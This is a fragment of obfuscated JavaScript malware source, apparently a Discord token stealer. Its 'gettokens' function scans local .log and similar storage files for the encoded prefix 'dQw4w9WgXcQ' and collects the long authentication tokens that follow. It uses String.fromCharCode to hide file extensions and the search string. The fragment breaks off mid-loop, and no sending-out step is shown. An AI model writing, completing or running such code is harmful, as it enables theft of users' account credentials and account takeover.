...
function gettokens(_b) {
  ...
  try {
    ...
    if (!exists) return _out;
    const _files = fs.readdirSync(_lp);
    const _p = String.fromCharCode(100,81,119,52,119,57,87,103,88,99,81);
    for (const _file of _files) {
      if (!_file.endsWith(_s(3)) && !_file.endsWith(String.fromCharCode(46,108,111,103))) continue;
      try {
        const _raw = fs.readFileSync(path.join(_lp, _file));
        const _c = _raw.toString(String.fromCharCode(108,97,116,105,110,49));
        let _i = _c.indexOf(_p);
        while (_i !== -1) {
          let _start = _i;
          let _end = _i;
          while (_end < _c.length && /[A-Za-z0-9+/=_-]/.test(_c[_end])) _end++;
          let _tok = _c.slice(_start, _end);
          if (_tok.length >= 50 && !_seen.has(_tok)) { _seen.add(_tok); _out.push(_tok); }
          _start = _i + _p.length;
          while (_start < _c.length && /[\s:="]/.test(_c[_start])) _start++;
          _end = _start;
          while (_end < _c.length && /[A-Za-z0-9+/=_-]/.test(_c[_end])) _end++;
          _tok = _c.slice(_start, _end);
          if (_tok.length >= 50 && !_seen.has(_tok)) { _seen.add(_tok); _out.push(_tok); }
          _i = _c.indexOf(_p, _end);
        }
        const _re1 = /dQw4w9WgXcQ:"([^"]+)"/g;
        const _re2 = /dQw4w9WgXcQ:([A-Za-z0-9+/=_-]{50,})/g;
        let _m;
        while ((_m = _re1.exec(_c)) !== null) { if (!_seen.has(_m[1])) { _seen.add(_m[1]); _out.push(_m[1]); } }
